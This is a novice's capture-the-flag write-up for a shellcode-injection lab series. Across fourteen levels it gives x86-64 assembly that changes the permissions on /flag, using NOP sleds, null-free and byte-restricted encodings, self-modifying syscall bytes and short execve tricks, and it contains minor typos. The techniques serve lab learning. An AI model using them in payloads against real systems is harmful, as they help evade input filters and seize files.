# 1. Chmod:
-You can use command `cd /` to see file flag.
-So, it is simple that you only chmod(/flag).
```
.global _start
_start:
.intel_syntax noprefix
      lea rdi, [rip + flag]
      mov rsi, 4
      mov rax, 0x5a
      syscall
      flag:
          .asciz "/flag'
```
# 2. Nop sled:
-A portion of your input is randomly skipped at 0x800 bytes, so you need to skip 0x800 bytes.
-Nop is the insruction is do not anything, only create a empty memory.
```
.global _start
_start:
.intel_syntax noprefix
.rept 0x800
nop
.endr
      lea rdi, [rip + flag]
      mov rsi, 4
      mov rax, 0x5a
      syscall
      flag:
          .asciz "/flag"
```
# 3. No null bytes:
-This exercise is necessary , because it is fundamental knowledge for exploit functions. 
```
.global _start
_start:
.intel_syntax noprefix
    mov ebx, 0x67616c66
    shl rbx, 8
    mov bl, 0x2f
    push rbx
    mov rdi, rsp
    xor rsi, rsi
    mov sil, 4
    mov al, 0x5a
    syscall
```
# 4. No H byte:
-I started trying to write shellcode without null bytes and byte 0x48(H byte). But I am not successful. 
-So I test with only no byte 0x48.
-Fortunately, it works.
```
.global _start
_start:
.intel_syntax noprefix
lea edi, [rip + flag]
xor esi, esi
mov sil, 0x4
mov al, 0x5a
syscall
flag:
     .asciz "/flag"
```
-When I make this write up, I am only a newbie. Therefore, in the future, I will try to make it better.
# 5. No form of system call bytes (syscall, sysenter, int):

```
.global _start
_start:
.intel_syntax noprefix
lea edi, [rip + flag]
xor esi, esi
mov sil, 0x4
mov al, 0x5a
inc byte ptr [rip + sys1 + 1]
inc byte ptr [rip + sys1]

sys1:
.byte 0x0e
.byte 0x04
flag:
     .asciz "/flag"
```
# 6. No form of system call bytes (syscall, sysenter, int) && Nop sled:
```
.global _start
_start:
.intel_syntax noprefix
.rept 0x1000
nop
.endr
lea edi, [rip + flag]
xor esi, esi
mov sil, 0x4
mov al, 0x5a
inc byte ptr [rip + sys1 + 1]
inc byte ptr [rip + sys1]

sys1:
.byte 0x0e
.byte 0x04
flag:
     .asciz "/flag"
```
# 7. All file descriptors (including stdin, stderr and stdout!) are closed:
-I only use syscall chmod, so I can use the code from level before.
# 8. Only get 18 bytes:
-The solution is that we need to use execve syscall, and file is catflag.c 
```
// catflag.c

void main()
{
    chmod("/flag", 4);
}
```
-Then I only write shellcode to execve catflag.c. However, the intereting thing is command gcc `catflag.c -o \;` , the file output is `";"`, the reason for this is `";"` in hex is 0x3b and also the value of rax register. So we can use this value for rdi register.
```
.global _start
_start:
.intel_syntax noprefix
mov al, 0x3b
push rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
syscall
```
-The other way is using soft link `ln -s /flag f` (f is a symbol, you can change if you want character better). Therefore, when you use chmod syscall, it will be shorter.
# 9. Challenge modified your shellcode by overwriting every other 10 bytes with 0xcc.
-I continue to use my file catflag.c in level9.
-The idea to solve this challenge is use nop-sled; however, when I only use label next, it do not work correctly. I have tried many metho but no hope.... Finally, I test with label next1 in label next; fortunatelly, I have flag. 
```
.global _start
_start:
.intel_syntax noprefix
mov al, 0x3b
push rax
mov rdi, rsp
jmp next
.rept 0x10
nop
.endr
next:
xor rsi, rsi
jmp next1
.rept 0x10
nop
.endr
next1:
xor rdx, rdx
syscall
```
# 10. Level 10:
-My code at level 4 still work.
# 11. Level 11:
-My code at level 4 still work.
# 12. Level 12:
-It requires no byte alike.

```
.global _start
_start:
.intel_syntax noprefix
push 0x3b
mov rdi, rsp
xor esi, esi
cdq
pop rax
syscall
```
`cdq` make value of rdx is 0. If do not have this, the code will work wrong when execve execute.
# 13. Level 13:
-My code at level 12 still work.
# 14. Level 14:
-Troll VN=)))).
-It requires only 6 bytes=)))).
